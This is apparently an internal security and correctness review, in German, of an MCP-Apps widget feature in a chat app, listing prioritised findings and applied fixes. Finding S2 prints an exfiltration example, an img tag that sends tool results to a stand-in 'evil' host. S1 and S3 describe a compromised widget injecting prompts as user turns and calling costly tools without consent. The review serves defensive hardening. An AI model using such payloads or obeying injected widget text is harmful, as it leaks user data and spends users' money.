# MCP-Apps Feature — Review & Security-Check (2026-06-24)

> Nach der Live-Iteration: unabhängiger Security- + Correctness-Review (2 Agenten) synthetisiert.
> Trust-Modell: Der User verbindet den MCP-Server bewusst (semi-trusted), **aber** das Widget-HTML
> ist opak/nicht auditierbar und ein Server kann kompromittiert sein. Feature ist flag-gated (default aus).

## Was solide ist (Vertrauensbasis)
- **iframe-Origin-Isolation korrekt**: `sandbox` ohne `allow-same-origin` → opaque Origin. Widget kommt
  **nicht** an Host-DOM, localStorage oder die Auth-Cookies (`bj_id_token`/`bj_refresh`). Kern-Schutz hält.
- **Server-Scoping echt**: `resolveServer` lässt nur global-aktive, env-gated Server zu; OAuth-Server nur mit
  aktiver per-User-Verbindung (`resolveChatMcp`). Kein Zugriff auf fremde/unverbundene Server. Per-Call,
  nie gecacht (kein Cross-User-Leak).
- **SSRF abgedeckt** (`isAllowedUrl`), `uri` auf `ui://` beschränkt.
- **Feature-Gating vollständig**: alle 3 Routen 404 ohne Flag; Hook no-op; Mount gated. Default aus.
- **Auth + Rate-Limit** auf allen Routen. Cross-Widget-Isolation via `event.source`-Filter.

## Funde (priorisiert)

### Tier 1 — Quick Wins (low risk, sofort)
| # | Sev | Datei | Issue | Fix |
|---|-----|-------|-------|-----|
| C1 | **High** | `lib/rate-limit.ts:46` | Rate-Limit-Bucket nur per `userId` — `app-call`-Polling teilt sich den Topf mit `/api/chat`, `/api/chats` etc.; das erste Fenster setzt das Limit für alle. Polling kann echten Chat aushungern und umgekehrt. **Betrifft Bestand, nicht nur uns.** | Bucket nach Route namespacen: `key = userId:config.name`; eigener Preset für `app-call`. |
| C5 | Med | `mcp-app-frame.tsx` `dbg`, `app-host.ts:31` | `window.__MCP_APP_LOG` wächst unbegrenzt (~60 Einträge/min); `console.info` pro Poll (Client+Vercel). | Hinter `NEXT_PUBLIC_MCP_APPS_DEBUG` gaten + Array auf ~500 cappen; Server-Log gaten. |
| — | Med | `mcp-app-frame.tsx` cleanup | Cleanup ruft `teardownResource`, aber **nicht** `transport.close()` → window-`message`-Listener leakt bei Unmount (mehrere Widgets/Scroll). | Transport-Ref halten, im Cleanup `transport.close()` (existiert). |
| C3 | Med | `app-host.ts:148,165` | Fehler-Mapping wirft Timeout/Exec-Error/Connect-Drop alle als `connect_failed` (502); Tool-not-found als 403. Widget kann nicht sinnvoll backoffen. | Timeout→504, In-band Tool-`isError`→200 mit Result, not-found→404. |
| C2 | Med | `mcp-app-frame.tsx:70` | iframe-Höhe bleibt bei 120px, wenn Widget nie `sizechange` sendet → Clipping. | Default ~360px + best-effort Messung bei `load`. |
| C7 | Low | `app-tools/route.ts` | Verbindet bei jedem Page-Load zu ALLEN aktiven Servern (Map-Cache nur modul-lokal). Langsamer Server = bis 5s Latenz. | Server-seitiger TTL-Cache (60s, per userId), wie MCP-Config-Cache. |
| C8 | Low | `mcp-app-frame.tsx:167`, `chat-message.tsx:144` | `URL.revokeObjectURL` synchron nach `a.click()` kann Download abbrechen. | Revoke per `setTimeout(…, 10s)` deferren. |
| S7 | Low | `app-call/route.ts:46` u.a. | Roher `getErrorMessage` als `detail` an Client (kann Upstream-URL enthalten; keine Tokens). | Generisches `detail` an Client, volle Msg nur server-seitig loggen. |

### Tier 2 — Security-Härtung (empfohlen jetzt, kleine Designentscheidung)
| # | Sev | Datei | Issue | Fix |
|---|-----|-------|-------|-----|
| S2 | **High** | `mcp-app-frame.tsx:46-52` | Injizierte CSP enthält `https:` in `script-src` **und** `img-src` → `connect-src 'none'` ist wertlos: Widget kann Tool-Result via `<img src="https://evil/?d=…">` **exfiltrieren** und Remote-JS laden. | `script-src 'unsafe-inline'` only (kein https:/data:/blob:); `img-src 'self' data: <declared resourceDomains>`. **Vorher prüfen**, ob Higgsfield `csp.resourceDomains` deklariert — sonst kontrollierte Allowlist, damit Bilder weiter laden. |
| S4 | Med | `mcp-app-frame.tsx:121` | `buildAllowAttribute(ui.permissions)` nimmt die Permissions-Policy (camera/mic/geo) **vom fremden Server** ungefiltert → Drive-by-Berechtigungsdialoge. | `ui.permissions` gegen Host-Allowlist intersecten, oder `allow` für v1 droppen. |
| S1 | **High** | `mcp-app-frame.tsx:182`, `chat-view.tsx:623` | `ui/message` schiebt **beliebigen** Widget-Text unattributiert als **User**-Turn in den Chat — ohne User-Geste, ohne Längenlimit, mit Zugriff auf den **gesamten** Agent (alle Tools/Memory). Prompt-Injection durch kompromittiertes Widget. | Längenlimit; sichtbare Attribution („vom Widget"); idealerweise als Notiz statt User-Turn. Volle Consent → Tier 3. |
| S5 | Med | `mcp-app-frame.tsx:158` | `ondownloadfile` lädt ohne User-Geste, Dateiname/Inhalt vom Widget. | Geste verlangen (Host-Button) + Dateiname sanitizen. |
| S6 | Low | `mcp-rich-result.tsx:20` | Ebene A (default **an**) lädt entfernte MCP-Bild-URLs automatisch → IP/Beacon-Leak, kein Opt-in. | Optional: Medien proxien oder dokumentieren. |

### Tier 3 — Größere Designentscheidung (= M2.5)
- **S3 [Med/High]** `app-host.ts:130`: Tool-Allowlist greift nur wenn `enabledTools` gesetzt — sonst **alle** Tools
  erlaubt (siehe MEMORY `feedback_expert_allowed_tools_pitfall`). Plus `arguments: z.record(unknown)` = beliebig,
  **ohne User-Consent**. Ein bösartiges Widget kann teure/destruktive Tools (`generate_video`, `transactions`)
  mit beliebigen Args aufrufen → Credits/Geld. **Fix:** Default-Deny für app-call wenn `enabledTools` leer,
  und/oder Consent für nicht-idempotente Tools.
- **C4 [Med, strukturell]** `app-host.ts`: Pro Poll DB-Read + OAuth-Decrypt + MCP-`initialize` + `tools/list`
  (vom SDK erzwungen — kein direktes `callTool`) + `tools/call` + close. Pooling ist **verboten** (OAuth-PRD).
  → Hebel ist **Widget-seitiger Poll-Backoff** (können wir nicht erzwingen) oder dokumentieren/akzeptieren.
- updateModelContext + sampling (Feature-Vollständigkeit, bewusst zurückgestellt).

## Umgesetzt (2026-06-24, Tier 1 + Tier 2)
- **C1** Rate-Limit nach Route namespacen + eigener `mcpPoll`-Bucket (120/min) für app-call. ✅
- **Transport-Leak**: `transport.close()` im Cleanup. ✅
- **C5** Diagnose hinter `NEXT_PUBLIC_MCP_APPS_DEBUG` (default aus) + `__MCP_APP_LOG` auf 500 gecappt;
  Server-Timing-Logs gated, Failures bleiben `console.warn`. ✅
- **C3** Fehler-Mapping: `timeout`→504, `tool_not_found`→404; In-band Tool-`isError` bleibt 200. ✅
- **C2** iframe-Default-Höhe 360px. ✅
- **C7** app-tools server-seitiger 60s-Cache pro User. ✅
- **C8** `URL.revokeObjectURL` deferred. ✅ **S7** Client-`detail` URL-bereinigt + gekappt. ✅
- **S2** CSP gehärtet: `script-src`/`style-src` ohne remote `https:` (data:/blob: bleiben), `connect-src 'none'`;
  img/media `https:` bleibt (Higgsfield deklariert keine resourceDomains). Gegen echtes Widget verifiziert
  (initialisiert, keine CSP-Violation). ✅
- **S4** Permissions-Policy gegen Host-Allowlist (`clipboardWrite`) gefiltert — kein Drive-by Kamera/Mikro/Geo. ✅
- **S1** `ui/message` auf 2000 Zeichen gekappt; Text ist als User-Turn im Chat sichtbar (inhärente Attribution).
  Volle Geste/Consent → Tier 3. ✅(teilweise)
- **S5** Download-Dateiname sanitized. (Auto-Download ohne Geste bleibt → Tier 3.) ✅(teilweise)

**Offen (Tier 3 / M2.5):** S3 (Consent/Default-Deny für app-call), S1/S5 volle Geste, C4 (Backoff dokumentieren),
S6, updateModelContext, sampling.

## Empfohlene Reihenfolge
1. **Tier 1** komplett (mechanisch, risikoarm, behebt u. a. den realen Rate-Limit-Bug).
2. **Tier 2** S2 + S4 + S1-Mitigation (Exfil + Drive-by + Injection eindämmen) — macht das Feature auch für
   weniger vertrauenswürdige Server tragbar.
3. **Tier 3** als M2.5 mit eigener Entscheidung (Consent-Modell, Persistenz, sampling).
